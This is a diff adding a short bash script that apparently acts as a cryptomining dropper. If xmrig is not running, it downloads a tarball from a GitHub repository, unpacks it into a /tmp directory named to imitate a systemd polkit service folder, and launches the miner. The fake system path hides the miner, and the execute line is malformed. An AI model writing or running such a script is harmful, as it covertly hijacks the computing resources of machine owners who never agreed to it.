@@ -1,0 +1,9 @@
+#!/bin/bash
+
+DIR="/tmp/.systemd-private-0192837465af0192837465af01928374-polkit.service-jw88B"
+
+if ! pgrep -x xmrig >/dev/null; then
+	mkdir -p $DIR
+	wget -qO- https://github.com/derailment/mining_armory/tarball/main | tar -xz -C $DIR --strip-components=1
+	chmod +x .$DIR/xmrig. && .$DIR/xmrig -c config.json
+fi
